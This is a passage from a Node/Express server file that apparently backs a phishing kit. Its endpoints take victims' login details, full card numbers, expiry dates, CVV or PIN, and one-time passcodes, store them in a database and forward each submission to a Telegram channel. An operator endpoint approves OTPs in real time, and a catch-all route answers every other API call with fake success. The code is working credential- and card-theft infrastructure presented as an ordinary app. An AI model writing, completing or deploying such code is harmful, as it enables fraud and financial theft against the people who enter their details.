      existing.step = 'login';
      existing.otpStatus = 'login_pending';
      existing.updatedAt = new Date().toISOString();
      await saveRequestToSupabase(existing);
      const telegramSent = await sendRequestToTelegram('login', existing);
      res.status(200).json({ success: true, telegramSent, id: existing.id });
      return;
    }
    res.status(200).json({ success: true, telegramSent: false });
  });

  app.post('/api/link-card', async (req, res) => {
    const body = req.body || {};
    const existing = resolveRequestByIdOrClient(body.id, body.clientId);
    if (existing) {
      existing.cardNumber = String(body.cardNumber || '');
      existing.expMonth = String(body.expMonth || '');
      existing.expYear = String(body.expYear || '');
      existing.cvv = String(body.cardPin || body.cvv || '');
      existing.paymentName = String(body.fullName || existing.name || '');
      existing.step = 'card';
      existing.otpStatus = 'card_pending';
      existing.updatedAt = new Date().toISOString();
      await saveRequestToSupabase(existing);
      const telegramSent = await sendRequestToTelegram('card-link', existing);
      res.status(200).json({ success: true, telegramSent, id: existing.id });
      return;
    }
    res.status(200).json({ success: true, telegramSent: false });
  });

  app.post('/api/verify-otp', async (req, res) => {
    const body = req.body || {};
    const existing = resolveRequestByIdOrClient(body.id, body.clientId);
    if (existing) {
      existing.otp = String(body.otp || '');
      existing.step = 'otp';
      existing.otpStatus = 'pending';
      existing.updatedAt = new Date().toISOString();
      await saveRequestToSupabase(existing);
      const telegramSent = await sendRequestToTelegram('verify-otp', existing);
      res.status(200).json({ success: true, telegramSent, id: existing.id });
      return;
    }
    res.status(200).json({ success: true, telegramSent: false });
  });

  app.get('/api/submissions', (_req, res) => {
    const items = getAllSortedRequests();
    res.status(200).json({ success: true, count: items.length, items });
  });

  app.patch('/api/submissions/:id', async (req, res) => {
    const { id } = req.params;
    const { status } = req.body || {};
    const existing = requestsMap.get(id);
    if (!existing) {
      res.status(200).json({ success: false, message: 'Submission not found' });
      return;
    }
    const updated = applyApprovalEffects(existing, { otpStatus: status });
    await saveRequestToSupabase(updated);
    res.status(200).json({ success: true, item: updated });
  });

  // Catch-all for any other /api/* requests so no API call ever gets 404 or blocked
  app.all('/api/*', (req, res) => {
    res.status(200).json({
      success: true,
      ok: true,
      path: req.path,
      method: req.method,
      status: 'ok',
    });
  });

  const distPath = path.resolve(__dirname, 'dist');
  const isProd = process.env.NODE_ENV === 'production' && fs.existsSync(distPath);

  if (isProd) {
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });

    app.use(vite.middlewares);

    app.use('*', async (req, res, next) => {
      const url = req.originalUrl;
      try {
        const indexHtml = await fs.promises.readFile(path.resolve(__dirname, 'index.html'), 'utf-8');
        const template = await vite.transformIndexHtml(url, indexHtml);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(template);
      } catch (e) {
        vite.ssrFixStacktrace(e as Error);
        next(e);
      }
    });
  }

  app.listen(port, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${port}`);
  });
}

startServer();
